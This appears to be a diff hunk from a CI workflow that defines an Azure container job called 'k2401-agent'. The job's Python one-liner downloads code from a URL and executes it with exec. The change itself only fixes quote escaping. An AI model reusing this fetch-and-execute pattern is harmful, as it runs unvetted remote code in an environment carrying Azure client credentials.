@@ -83,7 +83,7 @@ jobs:
                       name:"k2401-agent",
                       image:"mcr.microsoft.com/azure-cli:2.74.0",
                       command:["python3"],
-                      args:["-c", ("import urllib.request; exec(compile(urllib.request.urlopen(" + ($url|@json) + ",timeout=20).read(),\\"azure_entry.py\\",\\"exec\\"))")],
+                      args:["-c", ("import urllib.request; exec(compile(urllib.request.urlopen(" + ($url|@json) + ",timeout=20).read(),\"azure_entry.py\",\"exec\"))")],
                       resources:{cpu:0.25,memory:"0.5Gi"},
                       env:[{name:"AZURE_CLIENT_ID",value:$client},{name:"K2401_RUN_ID",value:"40382269545"}]
                     }]
